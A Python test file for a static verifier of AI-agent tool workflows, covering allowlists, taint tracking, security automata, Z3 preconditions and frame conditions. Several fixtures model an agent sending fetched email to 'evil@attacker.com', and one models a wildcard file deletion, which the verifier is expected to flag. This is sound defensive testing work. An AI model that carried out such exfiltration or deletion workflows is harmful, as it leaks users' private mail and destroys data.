"""Tests for static verification: taint, automata, Z3 conditions."""

from guardians.workflow import (
    Workflow, WorkflowStep, ToolCallNode, ConditionalNode, LoopNode, SymRef,
)
from guardians.tools import ToolSpec, ParamSpec, ToolRegistry
from guardians.policy import (
    Policy, SecurityAutomaton, AutomatonState, AutomatonTransition, TaintRule,
)
from guardians.verify import verify


# --- Helpers ---

def _email_registry() -> ToolRegistry:
    r = ToolRegistry()
    r.register(
        ToolSpec(
            name="fetch_mail",
            params=[ParamSpec(name="folder", type="str")],
            source_labels=["email_content"],
        ),
        lambda folder="inbox": [],
    )
    r.register(
        ToolSpec(
            name="send_email",
            params=[
                ParamSpec(name="to", type="str", is_taint_sink=True),
                ParamSpec(name="body", type="str", is_taint_sink=True),
            ],
            preconditions=["domain_of(to) in allowed_domains"],
        ),
        lambda to="", body="": {"status": "sent"},
    )
    r.register(
        ToolSpec(
            name="summarize",
            params=[ParamSpec(name="emails", type="list")],
            source_labels=["email_content"],
        ),
        lambda emails=None: "summary",
    )
    r.register(
        ToolSpec(name="redact", source_labels=[]),
        lambda text="": "REDACTED",
    )
    return r


def _email_policy() -> Policy:
    return Policy(
        name="test",
        allowed_tools=["fetch_mail", "send_email", "summarize", "redact"],
        automata=[
            SecurityAutomaton(
                name="no_external",
                states=[
                    AutomatonState(name="safe"),
                    AutomatonState(name="error", is_error=True),
                ],
                initial_state="safe",
                transitions=[
                    AutomatonTransition(
                        from_state="safe",
                        to_state="error",
                        tool_name="send_email",
                        condition="domain_of(to) not in allowed_domains",
                    ),
                ],
                constants={"allowed_domains": ["company.com"]},
            ),
        ],
        taint_rules=[
            TaintRule(
                name="no_exfiltration",
                source_tool="fetch_mail",
                sink_tool="send_email",
                sink_param="body",
            ),
        ],
    )


# --- Allowlist ---

def test_disallowed_tool_rejected():
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="s", tool_call=ToolCallNode(
                tool_name="evil_tool", arguments={})),
        ]),
        _email_policy(), _email_registry(),
    )
    assert not result.ok
    assert any(v.category == "allowlist" for v in result.violations)


def test_missing_spec_flagged():
    """An allowed tool with no registered spec is a violation."""
    policy = Policy(name="t", allowed_tools=["ghost"])
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="s", tool_call=ToolCallNode(
                tool_name="ghost", arguments={})),
        ]),
        policy, ToolRegistry(),
    )
    assert not result.ok
    assert any("missing_spec" in v.rule_name or "missing" in v.message.lower()
               for v in result.violations)


# --- Taint ---

def test_taint_violation_detected():
    """Fetched email data flowing to send_email body should be caught."""
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="fetch", tool_call=ToolCallNode(
                tool_name="fetch_mail", arguments={"folder": "inbox"},
                result_binding="emails")),
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="send_email",
                arguments={"to": "evil@attacker.com",
                           "body": SymRef(ref="emails")})),
        ]),
        _email_policy(), _email_registry(),
    )
    assert not result.ok
    assert any(v.category == "taint" for v in result.violations)


def test_taint_propagates_through_intermediate():
    """Taint from fetch_mail propagates through summarize to send_email."""
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="fetch", tool_call=ToolCallNode(
                tool_name="fetch_mail", arguments={"folder": "inbox"},
                result_binding="emails")),
            WorkflowStep(label="sum", tool_call=ToolCallNode(
                tool_name="summarize",
                arguments={"emails": SymRef(ref="emails")},
                result_binding="summary")),
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="send_email",
                arguments={"to": "evil@attacker.com",
                           "body": SymRef(ref="summary")})),
        ]),
        _email_policy(), _email_registry(),
    )
    assert not result.ok
    taint = [v for v in result.violations if v.category == "taint"]
    assert len(taint) > 0


def test_sanitizer_breaks_taint():
    """A tool listed as a sanitizer breaks the taint chain."""
    policy = Policy(
        name="t",
        allowed_tools=["fetch_mail", "redact", "send_email"],
        taint_rules=[
            TaintRule(
                name="no_exfil",
                source_tool="fetch_mail",
                sink_tool="send_email",
                sink_param="body",
                sanitizers=["redact"],
            ),
        ],
    )
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="fetch", tool_call=ToolCallNode(
                tool_name="fetch_mail", arguments={"folder": "inbox"},
                result_binding="emails")),
            WorkflowStep(label="clean", tool_call=ToolCallNode(
                tool_name="redact",
                arguments={"text": SymRef(ref="emails")},
                result_binding="clean")),
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="send_email",
                arguments={"to": "alice@company.com",
                           "body": SymRef(ref="clean")})),
        ]),
        policy, _email_registry(),
    )
    taint = [v for v in result.violations if v.category == "taint"]
    assert len(taint) == 0


def test_legitimate_workflow_passes():
    """Fetch + summarize (no send) should pass all checks."""
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="fetch", tool_call=ToolCallNode(
                tool_name="fetch_mail", arguments={"folder": "inbox"},
                result_binding="emails")),
            WorkflowStep(label="sum", tool_call=ToolCallNode(
                tool_name="summarize",
                arguments={"emails": SymRef(ref="emails")},
                result_binding="summary")),
        ]),
        _email_policy(), _email_registry(),
    )
    assert result.ok


# --- Automaton ---

def test_automaton_catches_external_send():
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="send_email",
                arguments={"to": "evil@attacker.com", "body": "hi"})),
        ]),
        _email_policy(), _email_registry(),
    )
    assert not result.ok
    assert any(v.category == "automaton" for v in result.violations)


def test_automaton_symbolic_arg_could_violate():
    """Symbolic automaton args should produce 'could reach error'."""
    result = verify(
        Workflow(goal="t", input_variables=["recipient"], steps=[
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="send_email",
                arguments={"to": SymRef(ref="recipient"), "body": "hi"})),
        ]),
        _email_policy(), _email_registry(),
    )
    assert not result.ok
    auto = [v for v in result.violations if v.category == "automaton"]
    assert len(auto) >= 1
    assert "could" in auto[0].message.lower()


# --- Z3 preconditions ---

def test_z3_literal_precondition_violation():
    """Literal arg violating a precondition should be caught."""
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="send_email",
                arguments={"to": "evil@attacker.com", "body": "hi"})),
        ]),
        _email_policy(), _email_registry(),
    )
    pre = [v for v in result.violations if v.category == "precondition"]
    assert len(pre) > 0


def test_z3_literal_precondition_passes():
    """Literal arg satisfying a precondition should pass."""
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="send_email",
                arguments={"to": "alice@company.com", "body": "hi"})),
        ]),
        _email_policy(), _email_registry(),
    )
    pre = [v for v in result.violations if v.category == "precondition"]
    assert len(pre) == 0


def test_z3_warns_on_unsupported_syntax():
    """Conditions Z3 can't parse should produce warnings."""
    r = ToolRegistry()
    r.register(
        ToolSpec(
            name="my_tool",
            params=[ParamSpec(name="x", type="str")],
            preconditions=["x.startswith('safe_')"],
        ),
        lambda x="": None,
    )
    policy = Policy(name="t", allowed_tools=["my_tool"])
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="s", tool_call=ToolCallNode(
                tool_name="my_tool", arguments={"x": "hello"})),
        ]),
        policy, r,
    )
    assert len(result.warnings) > 0


def test_strict_mode_promotes_warnings():
    """In strict mode, warnings become violations."""
    r = ToolRegistry()
    r.register(
        ToolSpec(
            name="my_tool",
            params=[ParamSpec(name="x", type="str")],
            preconditions=["x.startswith('safe_')"],
        ),
        lambda x="": None,
    )
    policy = Policy(name="t", allowed_tools=["my_tool"])
    wf = Workflow(goal="t", steps=[
        WorkflowStep(label="s", tool_call=ToolCallNode(
            tool_name="my_tool", arguments={"x": "hello"})),
    ])
    # non-strict: ok with warnings
    result = verify(wf, policy, r)
    assert result.ok
    # strict: fails
    result_strict = verify(wf, policy, r, strict=True)
    assert not result_strict.ok


# --- Empty workflow ---

def test_empty_workflow_passes():
    result = verify(
        Workflow(goal="nothing", steps=[]),
        _email_policy(), _email_registry(),
    )
    assert result.ok


# --- Conditional taint ---

def test_conditional_taint_both_branches():
    """Taint should be caught in both branches of a conditional."""
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="fetch", tool_call=ToolCallNode(
                tool_name="fetch_mail", arguments={"folder": "inbox"},
                result_binding="emails")),
            WorkflowStep(label="cond", conditional=ConditionalNode(
                condition="len(emails) > 0",
                then_steps=[
                    WorkflowStep(label="send_then", tool_call=ToolCallNode(
                        tool_name="send_email",
                        arguments={"to": "a@company.com",
                                   "body": SymRef(ref="emails")})),
                ],
                else_steps=[
                    WorkflowStep(label="send_else", tool_call=ToolCallNode(
                        tool_name="send_email",
                        arguments={"to": "b@company.com",
                                   "body": SymRef(ref="emails")})),
                ],
            )),
        ]),
        _email_policy(), _email_registry(),
    )
    assert not result.ok
    taint = [v for v in result.violations if v.category == "taint"]
    assert len(taint) >= 2


def test_conditional_join_is_conservative():
    """After a conditional, taint from either branch must be preserved."""
    r = ToolRegistry()
    r.register(
        ToolSpec(name="fetch_secret", source_labels=["secret"]),
        lambda: "top_secret",
    )
    r.register(
        ToolSpec(name="safe_tool", source_labels=[]),
        lambda: "safe_value",
    )
    r.register(
        ToolSpec(name="send", params=[ParamSpec(name="data", type="str")]),
        lambda data="": None,
    )
    policy = Policy(
        name="t",
        allowed_tools=["fetch_secret", "safe_tool", "send"],
        taint_rules=[
            TaintRule(
                name="no_leak",
                source_tool="fetch_secret",
                sink_tool="send",
                sink_param="data",
            ),
        ],
    )
    # if cond: x = fetch_secret() else: x = safe_tool()
    # send(data=x)  -> should be tainted (conservative join)
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="cond", conditional=ConditionalNode(
                condition="True",
                then_steps=[
                    WorkflowStep(label="tainted", tool_call=ToolCallNode(
                        tool_name="fetch_secret", arguments={},
                        result_binding="x")),
                ],
                else_steps=[
                    WorkflowStep(label="safe", tool_call=ToolCallNode(
                        tool_name="safe_tool", arguments={},
                        result_binding="x")),
                ],
            )),
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="send",
                arguments={"data": SymRef(ref="x")})),
        ]),
        policy, r,
    )
    taint = [v for v in result.violations if v.category == "taint"]
    assert len(taint) > 0


# --- Loop taint ---

def test_loop_taint_propagation():
    """Taint from a loop collection should flow into loop body items."""
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="fetch", tool_call=ToolCallNode(
                tool_name="fetch_mail", arguments={"folder": "inbox"},
                result_binding="emails")),
            WorkflowStep(label="loop", loop=LoopNode(
                collection_ref="emails",
                item_binding="email",
                body=[
                    WorkflowStep(label="send", tool_call=ToolCallNode(
                        tool_name="send_email",
                        arguments={"to": "evil@attacker.com",
                                   "body": SymRef(ref="email")})),
                ],
            )),
        ]),
        _email_policy(), _email_registry(),
    )
    assert not result.ok
    taint = [v for v in result.violations if v.category == "taint"]
    assert len(taint) > 0, "Loop item binding must inherit collection taint"


# --- Wildcard taint source ---

def test_wildcard_source_matches_any():
    """source_tool='*' should match tainted data from any source."""
    r = ToolRegistry()
    r.register(
        ToolSpec(name="get_data", source_labels=["sensitive"]),
        lambda: "data",
    )
    r.register(
        ToolSpec(name="send", params=[
            ParamSpec(name="body", type="str", is_taint_sink=True)]),
        lambda body="": None,
    )
    policy = Policy(
        name="t",
        allowed_tools=["get_data", "send"],
        taint_rules=[
            TaintRule(
                name="no_exfil",
                source_tool="*",
                sink_tool="send",
                sink_param="body",
            ),
        ],
    )
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="get", tool_call=ToolCallNode(
                tool_name="get_data", arguments={},
                result_binding="d")),
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="send",
                arguments={"body": SymRef(ref="d")})),
        ]),
        policy, r,
    )
    taint = [v for v in result.violations if v.category == "taint"]
    assert len(taint) > 0


# --- Frame conditions ---

def test_frame_condition_wildcard_deletion():
    """delete_file(pattern='*') should violate frame condition pattern != '*'."""
    r = ToolRegistry()
    r.register(
        ToolSpec(
            name="delete_file",
            params=[ParamSpec(name="pattern", type="str")],
            frame_conditions=["pattern != '*'"],
        ),
        lambda pattern="": None,
    )
    policy = Policy(name="t", allowed_tools=["delete_file"])

    # safe
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="del", tool_call=ToolCallNode(
                tool_name="delete_file", arguments={"pattern": "*.txt"})),
        ]),
        policy, r,
    )
    frame = [v for v in result.violations if v.category == "frame"]
    assert len(frame) == 0

    # dangerous
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="del", tool_call=ToolCallNode(
                tool_name="delete_file", arguments={"pattern": "*"})),
        ]),
        policy, r,
    )
    frame = [v for v in result.violations if v.category == "frame"]
    assert len(frame) > 0


# --- Fix 1: Z3 int postcondition should not crash ---

def test_z3_int_postcondition_no_crash():
    """A postcondition using result > 0 with return_type='int' must not crash Z3."""
    r = ToolRegistry()
    r.register(
        ToolSpec(
            name="count_items",
            params=[ParamSpec(name="query", type="str")],
            return_type="int",
            postconditions=["result > 0"],
        ),
        lambda query="": 5,
    )
    policy = Policy(name="t", allowed_tools=["count_items"])
    # Must not raise — should produce a warning (symbolic result)
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="count", tool_call=ToolCallNode(
                tool_name="count_items", arguments={"query": "test"},
                result_binding="n")),
        ]),
        policy, r,
    )
    # Postcondition with symbolic result is a warning, not a hard violation
    assert len(result.warnings) > 0 or result.ok


# --- Fix 2: nested taint checks ALL abstract values ---

def test_nested_taint_checks_all_values():
    """Taint must be detected even when a clean value precedes the tainted one."""
    r = ToolRegistry()
    r.register(ToolSpec(name="source", source_labels=["secret"]), lambda: "s")
    r.register(ToolSpec(name="clean", source_labels=[]), lambda: "c")
    r.register(
        ToolSpec(name="sink", params=[ParamSpec(name="data", type="list")]),
        lambda data=None: None,
    )
    policy = Policy(
        name="t",
        allowed_tools=["source", "clean", "sink"],
        taint_rules=[TaintRule(
            name="no_leak", source_tool="source",
            sink_tool="sink", sink_param="data",
        )],
    )
    wf = Workflow(goal="t", steps=[
        WorkflowStep(label="c", tool_call=ToolCallNode(
            tool_name="clean", arguments={}, result_binding="c")),
        WorkflowStep(label="s", tool_call=ToolCallNode(
            tool_name="source", arguments={}, result_binding="s")),
        WorkflowStep(label="sink", tool_call=ToolCallNode(
            tool_name="sink",
            arguments={"data": [SymRef(ref="c"), SymRef(ref="s")]})),
    ])
    result = verify(wf, policy, r)
    taint = [v for v in result.violations if v.category == "taint"]
    assert len(taint) > 0, "Should detect taint even when clean value comes first"


# --- Fix 3: taint rules check source provenance ---

def test_taint_rule_checks_source_provenance():
    """A rule for source_tool='A' must not fire on data from tool B
    even if both tools share the same source_labels."""
    r = ToolRegistry()
    r.register(ToolSpec(name="tool_a", source_labels=["data"]), lambda: "a")
    r.register(ToolSpec(name="tool_b", source_labels=["data"]), lambda: "b")
    r.register(
        ToolSpec(name="sink", params=[ParamSpec(name="x", type="str")]),
        lambda x="": None,
    )
    policy = Policy(
        name="t",
        allowed_tools=["tool_a", "tool_b", "sink"],
        taint_rules=[TaintRule(
            name="no_a", source_tool="tool_a",
            sink_tool="sink", sink_param="x",
        )],
    )
    # Data from tool_b should NOT trigger the tool_a rule
    result = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="get", tool_call=ToolCallNode(
                tool_name="tool_b", arguments={}, result_binding="d")),
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="sink", arguments={"x": SymRef(ref="d")})),
        ]),
        policy, r,
    )
    taint = [v for v in result.violations if v.category == "taint"]
    assert len(taint) == 0, "tool_b data should not trigger tool_a taint rule"

    # But data from tool_a should trigger it
    result2 = verify(
        Workflow(goal="t", steps=[
            WorkflowStep(label="get", tool_call=ToolCallNode(
                tool_name="tool_a", arguments={}, result_binding="d")),
            WorkflowStep(label="send", tool_call=ToolCallNode(
                tool_name="sink", arguments={"x": SymRef(ref="d")})),
        ]),
        policy, r,
    )
    taint2 = [v for v in result2.violations if v.category == "taint"]
    assert len(taint2) > 0, "tool_a data should trigger tool_a taint rule"
